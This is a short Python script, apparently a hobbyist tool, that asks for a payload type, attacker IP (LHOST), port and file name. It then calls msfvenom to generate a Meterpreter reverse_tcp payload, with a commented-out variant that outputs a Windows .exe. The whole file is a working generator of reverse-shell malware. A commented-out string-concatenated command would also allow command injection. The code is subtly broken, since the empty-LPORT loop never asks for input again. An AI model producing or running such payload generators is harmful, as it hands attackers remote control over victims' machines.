import subprocess

Payload = input("Enter The Type of Payload : ")
while Payload=="":
	print("-.-.-.-Error Please Enter The Payload-.-.-.-")
	Payload =input("Enter The Type of Payload : ")

LHOST = input("Enter The IP Address LHOST : ")
while LHOST=="":
	print("-.-.-.-Error Please Enter The LHOST-.-.-.-")
	LHOST=input("Enter The IP Address LHSOT : ")

LPORT = input("Enter The Set Received Code LPORT : ")
while LPORT=="":
	print("-.-.-.-Error Please Enter The LPORT-.-.-.-")

Filename = input("Enter The File Name Save : ")
while Filename=="":
	print("-.-.-.-Error Please Enter The File Name-.-.-.-")
	Filename=input("Enter The File Name Save ")
		
print("-----------------------------------------------------------")

print("Please Wait.. Your Payload Generating " + Payload + " With Your IP Address LHOST " + LHOST + " With Received Code is " + LPORT + " And Saved File Name is " + Filename )

print("..............This Will Not Take Long Time...............")


#SECURITY & SAFE

#a=
subprocess.call(["msfvenom" , "-p" , Payload+"/meterpreter/reverse_tcp" , "LHOST="+LHOST , "LPORT="+LPORT,"-o", Filename])

#b=subprocess.call(["msfvenom" , "-p" , Payload+"/meterpreter/reverse_tcp" , "LHOST="+LHOST , "LPORT="+LPORT,"-f" , "exe" , "-o" , Filename+".exe"])

#if Payload==android:
#	print(a)
#else:
#	print(b)


#NON SECURITY & NO SAFE

#subprocess.call("msfvenom -p " + Payload + " LHOST=" + LHOST + " LPORT="+ LPORT +" -o "+ Filename )


    
    
    